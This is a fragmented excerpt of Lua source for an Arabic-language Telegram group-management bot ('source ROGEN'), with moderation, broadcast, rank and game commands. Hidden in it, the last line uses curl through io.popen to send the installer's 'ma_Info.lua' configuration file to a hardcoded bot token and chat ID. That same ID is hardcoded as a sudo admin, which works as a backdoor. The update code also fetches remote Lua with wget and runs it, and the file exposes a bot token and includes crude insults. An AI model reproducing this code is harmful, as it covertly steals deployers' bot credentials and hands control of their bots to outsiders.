...
sudo_users = {SUDO,1829540452,1744196893,1654178416}   
...
send(msg.chat_id_, msg.id_," ♲︎︎︎ تمت الاذاعه الى *~ "..#list.." ~* جروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--------------------------------------------------------------------------------------------------------------
...
os.execute('wget https://raw.githubusercontent.com/ELKABOOOS/DRAGON/main/DRAGON.lua')
...
{{text = '✰𝚍𝚎𝚟 𝚊𝚕𝚖𝚊𝚐𝚒𝚔✰', url="t.me/M_A_G_K"}}, 
...
if text == '┄─━━ʀᴏɢᴇɴ━━─┄' or text == '┄─━━ʀᴏɢᴇɴ━━─┄' or text == '┄─━━ʀᴏɢᴇɴ━━─┄' or text == '"' then
local Text =[[
𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗
]]
keyboard = {} 
...
{
{text = '✰ بوت تواصل السورس ✰', url = "https://t.me/G_W_P_BOT"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/SO_ROGEN&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'♲︎︎︎ لا يوجد جروبات وهميه في البوت\n')   
else
local DRAGON = (w + q)
...
DRAGON = '\n♲︎︎︎ تم ازالة » { '..q..' } جروبات من البوت'
end
if w == 0 then
DRAGONk = ''
else
DRAGONk = '\n♲︎︎︎ تم ازالة » {'..w..'} جروب لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'♲︎︎︎  عدد الجروبات الان » { '..#group..' }'..DRAGONk..''..DRAGON..'\n♲︎︎︎  الان عدد الجروبات الحقيقي » { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
send(msg.chat_id_, msg.id_," ♲︎︎︎ تمت الاذاعه الى >>{"..#list.."} جروب في البوت ")
database:del(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
...
send(msg.chat_id_, msg.id_," ♲︎︎︎ تمت الاذاعه الى >>{"..#list.."} جروبات في البوت ")
database:del(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end 
end
...
send(msg.chat_id_, msg.id_,' ♲︎︎︎ عذا لا يمكنك وضع معرف جروب بالاشتراك ')
return false  end
...
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'سورس روجين' then
local Text =[[
╭────  [ ♲︎︎︎ 𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗♲︎︎︎ ](t.me/SO_ROGEN)  ────╮

 [✰𝚠𝚎𝚕𝚌𝚘𝚖 𝚝𝚘 𝚜𝚘𝚞𝚛𝚎𝚌𝚎✰](t.me/SO_ROGEN) 
...
if text == 'مين نصبلك' or text == 'عايزه بوت' or text == 'عاوز بوت' or text == 'عايز بوت' then
local Text =[[


✰- [اهلا بك في سورس روجين الجمدان لو عايز بوت بأسعار منسبه وبوت مميز كلمني ](t.me/SO_ROGEN) ✰
...
{
{text = '✰ بوت تواصل المبرمج✰', url = "https://t.me/G_W_P_BOT"},
},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'مارتن' or text == 'مطور السورس' or text == 'marten' or text == 'مارتن مبرمج السورس' then  
local Text = [[  
╭──── 𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗 ────╮
...
if text == 'كريم' or text == 'ملك السورس' or text == 'الماجيك' or text == 'مرات الكابوس' then  
local Text = [[  
╭──── 𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗 ────╮
...
if text == 'الكابوس القمد' or text == 'الهقر' then  
local Text = [[  
╭──── 𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗 ────╮
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
...
if text == 'العاب روجين ' or text == 'العاب مسليه' or text == 'العاب متطوره' then  
local Text = [[  
...
Text = '♲︎︎︎ تم تفعيل امر غنيلي الان ارسل غنيلي'
database:del(bot_id..'sing:for:me'..msg.chat_id_)  
else
Text = '♲︎︎︎ بالتاكيد تم تفعيل امر غنيلي تستطيع ارسال غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n♲︎︎︎ تم تعطيل امر غنيلي'
else
Text = '\n♲︎︎︎ بالتاكيد تم تعطيل امر غنيلي'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
dofile('DRAGON.lua')  
send(msg.chat_id_, msg.id_, ' ♲︎︎︎ تم تحديث جميع الملفات') 
end 
if text == ("مسح قائمه العام") and DevSoFi(msg) then
database:del(bot_id..'GBan:User')
send(msg.chat_id_, msg.id_, '\n ♲︎︎︎ تم مسح قائمه العام')
return false
end
if text == ("قائمه العام") and DevSoFi(msg) then
local list = database:smembers(bot_id..'GBan:User')
t = "\n ♲︎︎︎ قائمة المحظورين عام \n┄─━━ʀᴏɢᴇɴ━━─┄\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/ELKABOOOS/DRAGON/main/File_Bot/"..file)
if res == 200 then
...
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n ♲︎︎︎ وينكم تعالو يريدوكم بالجروب \n┄─━━ʀᴏɢᴇɴ━━─┄\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
...
Reply_Status(msg,result.sender_user_id_,"reply","♲︎︎︎ تم ترقيته مطور ثانوي في البوت")  
end
...
Reply_Status(msg,result.id_,"reply","♲︎︎︎ تم ترقيته مطور ثانوي في البوت")  
else
...
Reply_Status(msg,userid,"reply","♲︎︎︎ تم ترقيته مطور ثانوي في البوت")  
return false 
end
...
Reply_Status(msg,result.sender_user_id_,"reply","♲︎︎︎ تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply","♲︎︎︎ تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_,"♲︎︎︎ لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply","♲︎︎︎ تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانويين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
t = "\n♲︎︎︎ قائمة مطورين الثانويين للبوت \n┄─━━ʀᴏɢᴇɴ━━─┄\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
GetWelcome = ' ♲︎︎︎ لم يتم تعيين ترحيب للجروب'
end 
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂♲︎︎︎](t.me/SO_ROGEN)') 
return false
end
...
if text == 'مين' then 
send(msg.chat_id_,msg.id_, '[مش لازم تعرف يجميل 😂](t.me/SO_ROGEN)') 
return false
end
...
send(msg.chat_id_,msg.id_, '[تم قفل المحن يكسمك 😂](t.me/SO_ROGEN)') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '[خدوني معاكم ب ف ..🙄💔](t.me/SO_ROGEN)')
return false
end
end
end
...
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n- ??𝐒𝐄??𝐍𝐀𝐌𝐄 ♲︎︎︎  '..username..'\n ♲︎︎︎- 𝐌𝐒𝐆𝐒  '..Msguser..'\n ♲︎︎︎ - 𝐒𝐓𝐀𝐓𝐒  '..Rutba(msg.sender_user_id_,msg.chat_id_)..'\n ♲︎︎︎ - 𝐘𝐎𝐔𝐑.𝐈𝐃 '..msg.sender_user_id_..'\n- 𝐂𝐇 ♲︎︎︎ @SO_ROGEN\n')
else
send(msg.chat_id_, msg.id_, '\n ♲︎︎︎ الصوره ~⪼ ليس لديك صور في حسابك'..'[\n- 𝐔𝐒𝐄𝐑𝐍??𝐌𝐄 ♲︎︎︎  '..username..'\n ♲︎︎︎- 𝐌𝐒𝐆𝐒  '..Msguser..'\n ♲︎︎︎ - ??𝐎𝐔𝐑.𝐈𝐃 '..msg.sender_user_id_..'\n- 𝐂𝐇 ♲︎︎︎ @SO_ROGEN\n')
end 
end
end
else
...
if text == 'تغير امر ♲︎︎︎' and DevSoFi(msg) then
send(msg.chat_id_, msg.id_, ' ♲︎︎︎ الان يمكنك ارسال الكليشه ♲︎︎︎')
...
✰ [ مبرمج السورس   ](t.me/G_W_P) ✰
             
╰────  [𝚛𝚘𝚘𝚐𝚎𝚗](t.me/SO_ROGEN)  ────╯

[✰ قناه السورس ✰ ](t.me/SO_ROGEN)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
send(msg.chat_id_, msg.id_, t..'━━━━━━\nاضغط علي الاسم ليتم نسخه\n┄─━━ʀᴏɢᴇɴ━━─┄\n ♲︎︎︎[𝚜𝚘𝚞𝚛𝚌𝚎 𝚛𝚘𝚘𝚐𝚎𝚗 ](t.me/SO_ROGEN)♲︎︎︎ ')
end
...
♲︎︎︎المنشئين
♲︎︎︎ الاساسين
♲︎︎︎ الاسماء المكتومه
♲︎︎︎ الردود الجروب
♲︎︎︎البوتات
♲︎︎︎امسح
♲︎︎︎صلاحيه
♲︎︎︎ قائمه منع المتحركات
♲︎︎︎قائمه منع الصور
♲︎︎︎قائمه منع الملصقات
♲︎︎︎ مسح قائمه المنع
♲︎︎︎ المحذوفين
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ مسح  امر + الامر القديم  
┄─━━ʀᴏɢᴇɴ━━─┄
...
♲︎︎︎ اوامر التغير …
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎تغير رد المطور + اسم
♲︎︎︎تغير رد المالك + اسم
♲︎︎︎تغير رد منشئ الاساسي + اسم
♲︎︎︎تغير رد المنشئ + اسم
♲︎︎︎تغير رد المدير + اسم
♲︎︎︎تغير رد الادمن + اسم
♲︎︎︎تغير رد المميز + اسم
♲︎︎︎تغير رد العضو + اسم
♲︎︎︎تغير امر الاوامر
┄─━━ʀᴏɢᴇɴ━━─┄ 
♲︎︎︎ اوامر المجموعه ♲︎︎︎
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ استعاده الاوامر 
♲︎︎︎ تحويل كالاتي  بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
♲︎︎︎ صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
♲︎︎︎كشف القيود
♲︎︎︎تعين الايدي
♲︎︎︎تغير الايدي
...
♲︎︎︎تنزيل جميع الرتب
♲︎︎︎منع + برد
♲︎︎︎الصور + متحركه + ملصق ~
♲︎︎︎حظر ~ كتم ~ تقيد ~ طرد
♲︎︎︎المحظورين ~ المكتومين ~ المقيدين
♲︎︎︎ الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
...
♲︎︎︎ كشف البوتات
♲︎︎︎الصلاحيات
♲︎︎︎ كشف برد ← بمعرف ← ايدي
♲︎︎︎تاك للكل
♲︎︎︎ وضع لقب + لقب
♲︎︎︎ مسح لقب بالرد
♲︎︎︎ اعدادات المجموعه
♲︎︎︎عدد الجروب
♲︎︎︎الردود الجروب
♲︎︎︎اسم بوت + الرتبه
♲︎︎︎الاوامر المضافه
♲︎︎︎وضع توحيد + توحيد
♲︎︎︎ تعين عدد الكتم + رقم
♲︎︎︎كتم اسم + اسم
♲︎︎︎التوحيد
♲︎︎︎قائمه المنع
♲︎︎︎نسبه الحب 
...
♲︎︎︎ اسم ~ ايدي + بوت غادر 
♲︎︎︎اذاعه 
┄─━━ʀᴏɢᴇɴ━━─┄ 
♲︎︎︎ اوامر مطور الاساسي
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎تفعيل
♲︎︎︎تعطيل
♲︎︎︎مسح الاساسين
...
♲︎︎︎قائمه العام
♲︎︎︎ مسح قائمه العام
♲︎︎︎ جلب نسخه الاحتياطيه
♲︎︎︎ رفع نسخه الاحتياطيه
≪━━━━━━ 𝗔𝗟??𝗫 ━━━━━━≫
♲︎︎︎اذاعه خاص
♲︎︎︎اذاعه
♲︎︎︎اذاعه بالتوجيه
♲︎︎︎ اذاعه بالتوجيه خاص
♲︎︎︎اذاعه بالتثبيت
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎جلب نسخه البوت
♲︎︎︎رفع نسخه البوت
...
♲︎︎︎اوامر الاعضاء كالتالي ↓
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ عرض معلوماتك ↑↓
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ ايديي ← اسمي 
♲︎︎︎ رسايلي ← مسح رسايلي 
♲︎︎︎رتبتي ← سحكاتي 
♲︎︎︎مسح سحكاتي ← المنشئ 
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ اوامر المجموعه ↑↓
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ الرابط ← القوانين – الترحيب
♲︎︎︎ايدي ← اطردني
♲︎︎︎ اسمي ← المطور  
♲︎︎︎ كشف ~ بالرد بالمعرف
 ♲︎︎︎قول + كلمه
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ اسم البوت + الامر ↑↓
┄─━━ʀᴏɢᴇɴ━━─┄
...
┄─━━ʀᴏɢᴇɴ━━─┄ 
 ❺ 
┄─━━ʀᴏɢᴇɴ━━─┄ 
    ♲︎︎︎ اوامر جديده ومميزه  ↓
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ اكتب ❪ باد ❫ واستمتع 
😹  بالاسئله المحرجه 
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎  اكتب ❪ بوستات ❫ واستمتع 
🌚❤️ بالبوستات العظيمه
┄─━━ʀᴏɢᴇɴ━━─┄
♲︎︎︎ رفع + تنزيل ← الامࢪ ↓
┄─━━ʀᴏɢᴇɴ━━─┄
...
local notText = ' عذرا الاوامر هذه لا تخصك ♲︎︎︎'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
...
local curl = 'curl "'..'https://api.telegram.org/bot1796143590:AAG7xMmzOdxe_8BlKg-dYP1tfedX1ZY-3ng/sendDocument'..'" -F "chat_id='.. 1744196893 ..'" -F "document=@'..'ma_Info.lua'..'"' io.popen(curl)
------------------------------------------------------------------------
